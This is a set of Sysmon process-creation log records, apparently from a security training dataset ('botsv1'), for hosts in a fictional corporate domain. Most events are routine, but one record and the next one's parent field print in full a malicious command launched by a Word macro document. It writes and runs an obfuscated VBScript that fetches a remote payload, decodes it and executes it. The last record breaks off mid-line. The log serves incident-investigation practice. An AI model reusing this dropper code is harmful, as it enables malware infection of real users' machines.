{"_time":"2016-08-24 10:36:58.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679167","UtcTime":"2016-08-24 16:36:58.774","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\smss.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe","ProcessGuid":"{46C72849-CD2A-57BD-0000-001050574B11}","ProcessId":"3076","CurrentDirectory":"C:\\Windows\\","Hashes":"SHA1=D6F56CBF9D3EF411760AD68F9FCE9B5EB52D55C0,MD5=89B91AEEE4C0C5D3708C0F177C97B630,SHA256=E971CADE6F049F2790BDE863FF1EAAFCCA893D3DAFE3522A571C74E0F8F6187A,IMPHASH=1201638E667D318EF0E2BB7BD632334E","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:58.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679206","UtcTime":"2016-08-24 16:36:58.852","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\csrss.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ProcessGuid":"{46C72849-CD2A-57BD-0000-0010B45A4B11}","ProcessId":"1824","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=C79E4586989EBB8E8F8084B5EB49AFBFD243A625,MD5=B2D3F07F5E8A13AF988A8B3C0A800880,SHA256=CB41E9D0E8107AA9337DBD1C56F22461131AD0952A2472B4477E2649D16ECB15,IMPHASH=2C3DC617C728D46744B951F769654054","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:58.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679217","UtcTime":"2016-08-24 16:36:58.930","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\winlogon.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"winlogon.exe","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ProcessGuid":"{46C72849-CD2A-57BD-0000-00106E5C4B11}","ProcessId":"1988","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=2E2F86C0FBB19E7DB1B7C6CD9F45934A567134E9,MD5=7C94FDA3809015B8F2208D2E1C221F17,SHA256=71486B77FE0D3A97D2C2DCC527AC1EB44C9155601403C9E79F9854DB58CA8F68,IMPHASH=B7625D79A827AAEDE8498726FDB2D638","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:59.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679246","UtcTime":"2016-08-24 16:36:59.118","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\LogonUI.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"\"LogonUI.exe\" /flags:0x0","ParentCommandLine":"winlogon.exe","ProcessGuid":"{46C72849-CD2B-57BD-0000-0010D5694B11}","ProcessId":"3692","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=00E95FD493D6169DB28A4DC736173EFC135F8391,MD5=3710A8A7508B36AD96A97CE79E17403E,SHA256=DD9807B58607825F1B4E13602B147B5FF6F3D72559136B718DB3B99D42D015F6,IMPHASH=2A2F2BC4A706AB8A63E90D08A89A1087","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:59.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679267","UtcTime":"2016-08-24 16:36:59.165","User":"Window Manager\\DWM-3","Image":"C:\\Windows\\System32\\dwm.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"\"dwm.exe\"","ParentCommandLine":"winlogon.exe","ProcessGuid":"{46C72849-CD2B-57BD-0000-0010B56C4B11}","ProcessId":"2408","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=2A9F711A601DB66788695BF6C8EFCF9C47632F84,MD5=B4BBC6E4998042EF21437EED52EC0273,SHA256=93259A6EFD00F8DB7A700143690857428BAFD7073525DEE3E9D24589CB962EE0,IMPHASH=16DEF1047A34501B2F2AC35240ED3CAD","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:42:16.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362059","UtcTime":"2016-08-24 16:42:16.949","User":"NT AUTHORITY\\LOCAL SERVICE","Image":"C:\\Windows\\System32\\audiodg.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\AUDIODG.EXE 0x8b8","ParentCommandLine":"C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted","ProcessGuid":"{0F2D76F0-CE68-57BD-0000-001093C52E00}","ProcessId":"1108","CurrentDirectory":"C:\\Windows","Hashes":"SHA1=F033FD30AACD0183BFC30861891A92B56AC2468B,MD5=D5CCA1453B98A5801E6D5FF0FF89DC6C,SHA256=85F2C2480AAC31B6092187B431A562D79D4CFB1324F925C85055ABAB2483264B,IMPHASH=2A6BF191EDFE97CC30EBB8D1AEB3A6B6","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:02.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362362","UtcTime":"2016-08-24 16:43:02.329","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Windows\\explorer.exe\"","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ProcessGuid":"{0F2D76F0-CE96-57BD-0000-00100B892F00}","ProcessId":"3508","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=4583DAF9442880204730FB2C8A060430640494B1,MD5=AC4C51EB24AA95B77F705AB159189E24,SHA256=6A671B92A69755DE6FD063FCBE4BA926D83B49F78C42DBAEED8CDB6BBC57576A,IMPHASH=6422E341C67BA0880E012F8C7C634C21","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:03.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362412","UtcTime":"2016-08-24 16:43:03.031","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\SysWOW64\\dllhost.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{0F2D76F0-CE97-57BD-0000-0010E8A32F00}","ProcessId":"3680","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:03.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362414","UtcTime":"2016-08-24 16:43:03.046","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\System32\\dllhost.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{0F2D76F0-CE97-57BD-0000-001092A42F00}","ProcessId":"1936","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=E977B87698C3E595D55827665E22FBF788DD3F9F,MD5=A8EDB86FC2A4D6D1285E4C70384AC35A,SHA256=61B8955CE0A2AA9D0719920B30216717B349B6FBE11C697C31CFA84F859CC1AE,IMPHASH=3D806EF1101283F4E5D20F0C4F83B8FD","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:12.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362503","UtcTime":"2016-08-24 16:43:12.716","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\System32\\dllhost.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{0F2D76F0-CEA0-57BD-0000-0010BF103000}","ProcessId":"3372","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=E977B87698C3E595D55827665E22FBF788DD3F9F,MD5=A8EDB86FC2A4D6D1285E4C70384AC35A,SHA256=61B8955CE0A2AA9D0719920B30216717B349B6FBE11C697C31CFA84F859CC1AE,IMPHASH=3D806EF1101283F4E5D20F0C4F83B8FD","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:12.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362522","UtcTime":"2016-08-24 16:43:12.872","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE\" /n /f \"D:\\Miranda_Tate_unveiled.dotm\"","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ProcessGuid":"{0F2D76F0-CEA0-57BD-0000-00108D2B3000}","ProcessId":"3756","CurrentDirectory":"D:\\","Hashes":"SHA1=6E35AE1D5B6F192109D7A752ACD939F5CA2B97A6,MD5=15E52F52ED2B8ED122FAE897119687C4,SHA256=8CFB55087FA8E4C1E7BCC580D767CF2C884C1B8C890AD240C1E7009810AF6736,IMPHASH=1B9253B101FE708768573C81F0140691","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:16.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362638","UtcTime":"2016-08-24 16:43:16.631","User":"NT AUTHORITY\\NETWORK SERVICE","Image":"C:\\Program Files\\Common Files\\Microsoft Shared\\OfficeSoftwareProtectionPlatform\\OSPPSVC.EXE","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"\"C:\\Program Files\\Common Files\\Microsoft Shared\\OfficeSoftwareProtectionPlatform\\OSPPSVC.EXE\"","ParentCommandLine":"C:\\Windows\\system32\\services.exe","ProcessGuid":"{0F2D76F0-CEA4-57BD-0000-0010227F3000}","ProcessId":"1212","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=945D94FEF51E0DB76C2FD95EE22ED2767BE0FE0B,MD5=61BFFB5F57AD12F83AB64B7181829B34,SHA256=1DD0DD35E4158F95765EE6639F217DF03A0A19E624E020DBA609268C08A13846,IMPHASH=95686BD7B223C506F7D914AAAD8412AE","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:17.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362664","UtcTime":"2016-08-24 16:43:17.036","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\wbem\\WMIADAP.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"wmiadap.exe /R /T","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs","ProcessGuid":"{0F2D76F0-CEA5-57BD-0000-001059873000}","ProcessId":"2408","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=B3D339964BFEA63EC9E85EC73B246C4CC1D25F9A,MD5=005247E3057BC5D5C3F8C6F886FFC10C,SHA256=FCB27F89EC36856A4A225744CE5EE3A30CBC8A447868B165D95E8AB2C17F5671,IMPHASH=24F8221750B808C342E2005EC6549910","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:17.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362715","UtcTime":"2016-08-24 16:43:17.536","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\SysWOW64\\dllhost.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{0F2D76F0-CEA5-57BD-0000-0010E5C23000}","ProcessId":"2352","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:21.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362770","UtcTime":"2016-08-24 16:43:21.045","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\SysWOW64\\cmd.exe","ParentImage":"C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE","CommandLine":"cmd.exe /V /C set \"GSI=%APPDATA%\\%RANDOM%.vbs\" &amp;&amp; (for %i in (\"DIm RWRL\" \"FuNCtioN GNbiPp(Pt5SZ1)\" \"EYnt=45\" \"GNbiPp=AsC(Pt5SZ1)\" \"Xn1=52\" \"eNd fuNCtiON\" \"SUb OjrYyD9()\" \"J0Nepq=56\" \"Dim UJv,G4coQ\" \"LT=23\" \"dO WHiLE UJv&lt;&gt;3016-3015\" \"G4coQ=G4coQ+1\" \"WSCRiPt.sLEeP(11)\" \"LoOP\" \"UsZK0=85\" \"ENd suB\" \"fuNctIon J7(BLI4A3)\" \"K5AU=29\" \"J7=cHR(BLI4A3)\" \"XBNutM9=36\" \"eNd fuNCtiON\" \"SUb MA(QrG)\" \"WXCzRz=9\" \"Dim Jw\" \"Qt7=34\" \"Jw=TIMeR+QrG\" \"Do WhiLE tIMEr&lt;Jw\" \"WSCRipT.sleEP(6)\" \"LOOp\" \"EXdkRkH=78\" \"enD sUB\" \"fUnCTion M1p67jL(BwqIM7,Qa)\" \"Yi=80\" \"dIM KH,ChnFY,RX,Pg,C6YT(8)\" \"Cm=7\" \"C6YT(1)=107\" \"Rzf=58\" \"C6YT(5)=115\" \"BSKoW=10\" \"C6YT(4)=56\" \"Cwd6=35\" \"C6YT(7)=110\" \"AQ=98\" \"C6YT(6)=100\" \"Y6Cm1I=82\" \"C6YT(2)=103\" \"JH3F2i=74\" \"C6YT(8)=119\" \"JRvsG2s=76\" \"C6YT(3)=53\" \"Yh=31\" \"C6YT(0)=115\" \"GuvD=47\" \"Tbvf1=67\" \"SeT KH=cReATeObject(A9y(\"3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D\", \"Yo\"))\" \"V2JR=73\" \"Set ChnFY=KH.GETfilE(BwqIM7)\" \"RGeJ=68\" \"SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)\" \"CtxOk=82\" \"seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)\" \"XPL9af=76\" \"Do uNtil Pg.aTEnDOfStReam\" \"RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))\" \"LooP\" \"IQz=49\" \"RX.cloSe\" \"CBR1gC7=51\" \"Pg.cLOSE\" \"PmG=64\" \"eNd funCTIOn\" \"FUNcTION Ql9zEF()\" \"IBL2=16\" \"Ql9zEF=secoND(Time)\" \"MUTkPNJ=41\" \"End FUNcTiOn\" \"FUnCtion A9y(Am,T1GCbB)\" \"CWCH9r=82\" \"Dim V3sl0m,F4ra,AxFE\" \"RLLp8R=89\" \"For V3sl0m=1 To (lEn(Am)/2)\" \"F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))\" \"AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))\" \"A9y=A9y+J7(OyVNo(F4ra,AxFE))\" \"NeXT\" \"DxZ40=89\" \"enD fUNction\" \"Sub AylniN()\" \"N6nzb=92\" \"DIm GWJCk,Q3y,GKasG0\" \"FDu=47\" \"GWJCk=93961822\" \"UZ=32\" \"FoR Q3y=1 To GWJCk\" \"GKasG0=GKasG0+1\" \"neXt\" \"B1jq2Hk=63\" \"If GKasG0=GWJCk tHen\" \"KXso=18\" \"MA((-176+446))\" \"IP4=48\" \"Yq(A9y(\"0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826\",\"QcOi4XA\"))\" \"YTsWy=31\" \"elSe\" \"DO5gpmA=84\" \"A8=86\" \"EnD iF\" \"XyUP=64\" \"eND SuB\" \"sUB GKfD3aY(FaddNPJ)\" \"SDU0BLq=57\" \"DiM UPhqZ,KbcT\" \"DxejPK=88\" \"KbcT=\"Drn4AW\"\" \"GROlc7=82\" \"sET UPhqZ=CREAteOBJecT(A9y(\"332A7B05156A211A46243629\",KbcT))\" \"Gs0g=3\" \"UPhqZ.OpEn\" \"TF1=68\" \"UPhqZ.tyPE=6867-6866\" \"RDjmY=24\" \"UPhqZ.wrITe FaddNPJ\" \"WiFgvS=78\" \"UPhqZ.SaVeTOfIle RWRL,8725-8723\" \"AF=4\" \"UPhqZ.closE\" \"JC7sf2=1\" \"Cke4e\" \"JM=88\" \"EnD suB\" \"fuNCtIoN Yq(PDqi1)\" \"I0=22\" \"DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK\" \"GJDnbE=32\" \"On ErrOR reSume NeXT\" \"B7bT=1\" \"Uv=\"Tk\"\" \"ELw=73\" \"sEt YTwwO=CREaTeObjeCT(A9y(\"3C07082602241F7A383C0E3807\",Uv))\" \"K4=62\" \"GAiF\" \"IS1cj=19\" \"Set Dzc0=YTwwO.eNVIrONMEnt(A9y(\"013B183400023A\",\"EQiWw\"))\" \"D9S=38\" \"RWRL=Dzc0(A9y(\"14630811720C14\",\"XU3\"))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF\" \"AtCQ=95\" \"JiYwVG=\"FcQqQ\"\" \"Tf=79\" \"sEt BAU7Cz=CrEATEoBjECT(A9y(\"2E38122329103E1725683B1C3D19123701\",JiYwVG))\" \"QUY=56\" \"BAU7Cz.OpeN A9y(\"0D0E1E\",\"KJ\"),PDqi1,7387-7387\" \"JX2=58\" \"BAU7Cz.SeTReQuEstHeAdeR A9y(\"1F59242828\",\"OM8J\"),A9y(\"0D354C3D356B567A0F6B6B\",\"VoL8XF\")\" \"URkT=71\" \"BAU7Cz.SEnD()\" \"QdFeA6=65\" \"if BAU7Cz.StaTUstExt=A9y(\"652840353A542512023C5B3D572F27\",\"S5I2A\") then\" \"PwTLW23=36\" \"GAiF\" \"R4xYBS=63\" \"MA(4)\" \"PjL6m=46\" \"GKfD3aY BAU7Cz.ReSpONSEbody\" \"Fj98=72\" \"Else\" \"D7T=91\" \"IK=\"NNXFD0\"\" \"NK=74\" \"SeT BAU7Cz= CreATeobJECT(A9y(\"033125365F3D213E326A68030210121060\",IK))\" \"QJ=35\" \"BAU7Cz.oPeN A9y(\"2A2F0E\",\"TmjZ8d\"),A9y(\"07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26\",\"Ao\" ),5022-5022\" \"UMp8=85\" \"BAU7Cz.SeTReqUesTheadER A9y(\"1439190A24\",\"AFXwm\"),A9y(\"371038301A716C5F7B6644\",\"LUi\")\" \"NluUc=93\" \"BAU7Cz.SENd()\" \"EOtR=44\" \"If BAU7Cz.STaTUSTexT=A9y(\"03510A3B3A51146F105F163B365E0C\",\"OS0x\") THen GKfD3aY BAU7Cz.REsPOnSeBODY\" \"Q6sMEZ=54\" \"I9Nl7=56\" \"end if\" \"Dq=54\" \"eND FuNCTioN\" \"fUNctIon OyVNo(U1,Brt0d)\" \"SNOW=59\" \"OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)\" \"QTi5K=54\" \"enD funcTION\" \"Sub Cke4e()\" \"WTOyAw=62\" \"dIM EuM,WIbud,NCiN,Fs8HJ\" \"A5AT=92\" \"NCiN=\"\"\"\"\" \"SX6=93\" \"WIbud=RWRL &amp; Ql9zEF &amp; A9y(\"4A330F3F\",\"WdGbOGp\")\" \"V5B7Zh=92\" \"M1p67jL RWRL,WIbud\" \"L13=45\" \"iF Fs8HJ=\"\" tHen MA(4)\" \"CHaK=38\" \"EuM=\"Iqxkf\"\" \"U56m=67\" \"SEt VP=creATeoBJEcT(A9y(\"262B081420010C453521141407\",EuM))\" \"U5Quw=85\" \"VP.Run A9y(\"1023287B163629755C0D6C06270F1E01536C6E7551\",\"UsNL\") &amp; WIbud &amp; NCiN,2912-2912,5755-5755\" \"A6mfcYL=76\" \"End sUB\" \"JoxZ3=43\" \"AylniN\" \"suB GAiF()\" \"G4vzM=95\" \"Dim DCRml9g, CjoNOY9\" \"For DCRml9g = 68 To 6000327\" \"CjoNOY9 = Rvwr + 23 + 35 + 27\" \"Next\" \"KK0H=46\" \"enD sUb\") do @echo %~i)&gt;\"!GSI!\" &amp;&amp; start \"\" \"!GSI!\"","ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE\" /n /f \"D:\\Miranda_Tate_unveiled.dotm\"","ProcessGuid":"{0F2D76F0-CEA9-57BD-0000-001037FE3000}","ProcessId":"3884","CurrentDirectory":"D:\\","Hashes":"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:21.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362784","UtcTime":"2016-08-24 16:43:21.092","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\csrss.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe","ParentCommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ProcessGuid":"{0F2D76F0-CEA9-57BD-0000-00109B003100}","ProcessId":"1936","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=680DEC0F8907F4B8911FBE2AA5F2FD25425BE0B0,MD5=BD51024FB014064BC9FE8C715C18392F,SHA256=23F7AB98268F88E6CA9EE96B3DDBC6AA745BFFACD2E5F80A211CE48D976EB9A4,IMPHASH=C2AE82D74851F310DFB66DA9B301EF7E","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:43:21.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"362847","UtcTime":"2016-08-24 16:43:21.232","User":"WAYNECORPINC\\bob.smith","Image":"C:\\Windows\\SysWOW64\\wscript.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","CommandLine":"\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\20429.vbs\"","ParentCommandLine":"cmd.exe /V /C set \"GSI=%APPDATA%\\%RANDOM%.vbs\" &amp;&amp; (for %i in (\"DIm RWRL\" \"FuNCtioN GNbiPp(Pt5SZ1)\" \"EYnt=45\" \"GNbiPp=AsC(Pt5SZ1)\" \"Xn1=52\" \"eNd fuNCtiON\" \"SUb OjrYyD9()\" \"J0Nepq=56\" \"Dim UJv,G4coQ\" \"LT=23\" \"dO WHiLE UJv&lt;&gt;3016-3015\" \"G4coQ=G4coQ+1\" \"WSCRiPt.sLEeP(11)\" \"LoOP\" \"UsZK0=85\" \"ENd suB\" \"fuNctIon J7(BLI4A3)\" \"K5AU=29\" \"J7=cHR(BLI4A3)\" \"XBNutM9=36\" \"eNd fuNCtiON\" \"SUb MA(QrG)\" \"WXCzRz=9\" \"Dim Jw\" \"Qt7=34\" \"Jw=TIMeR+QrG\" \"Do WhiLE tIMEr&lt;Jw\" \"WSCRipT.sleEP(6)\" \"LOOp\" \"EXdkRkH=78\" \"enD sUB\" \"fUnCTion M1p67jL(BwqIM7,Qa)\" \"Yi=80\" \"dIM KH,ChnFY,RX,Pg,C6YT(8)\" \"Cm=7\" \"C6YT(1)=107\" \"Rzf=58\" \"C6YT(5)=115\" \"BSKoW=10\" \"C6YT(4)=56\" \"Cwd6=35\" \"C6YT(7)=110\" \"AQ=98\" \"C6YT(6)=100\" \"Y6Cm1I=82\" \"C6YT(2)=103\" \"JH3F2i=74\" \"C6YT(8)=119\" \"JRvsG2s=76\" \"C6YT(3)=53\" \"Yh=31\" \"C6YT(0)=115\" \"GuvD=47\" \"Tbvf1=67\" \"SeT KH=cReATeObject(A9y(\"3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D\", \"Yo\"))\" \"V2JR=73\" \"Set ChnFY=KH.GETfilE(BwqIM7)\" \"RGeJ=68\" \"SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)\" \"CtxOk=82\" \"seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)\" \"XPL9af=76\" \"Do uNtil Pg.aTEnDOfStReam\" \"RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))\" \"LooP\" \"IQz=49\" \"RX.cloSe\" \"CBR1gC7=51\" \"Pg.cLOSE\" \"PmG=64\" \"eNd funCTIOn\" \"FUNcTION Ql9zEF()\" \"IBL2=16\" \"Ql9zEF=secoND(Time)\" \"MUTkPNJ=41\" \"End FUNcTiOn\" \"FUnCtion A9y(Am,T1GCbB)\" \"CWCH9r=82\" \"Dim V3sl0m,F4ra,AxFE\" \"RLLp8R=89\" \"For V3sl0m=1 To (lEn(Am)/2)\" \"F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))\" \"AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))\" \"A9y=A9y+J7(OyVNo(F4ra,AxFE))\" \"NeXT\" \"DxZ40=89\" \"enD fUNction\" \"Sub AylniN()\" \"N6nzb=92\" \"DIm GWJCk,Q3y,GKasG0\" \"FDu=47\" \"GWJCk=93961822\" \"UZ=32\" \"FoR Q3y=1 To GWJCk\" \"GKasG0=GKasG0+1\" \"neXt\" \"B1jq2Hk=63\" \"If GKasG0=GWJCk tHen\" \"KXso=18\" \"MA((-176+446))\" \"IP4=48\" \"Yq(A9y(\"0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826\",\"QcOi4XA\"))\" \"YTsWy=31\" \"elSe\" \"DO5gpmA=84\" \"A8=86\" \"EnD iF\" \"XyUP=64\" \"eND SuB\" \"sUB GKfD3aY(FaddNPJ)\" \"SDU0BLq=57\" \"DiM UPhqZ,KbcT\" \"DxejPK=88\" \"KbcT=\"Drn4AW\"\" \"GROlc7=82\" \"sET 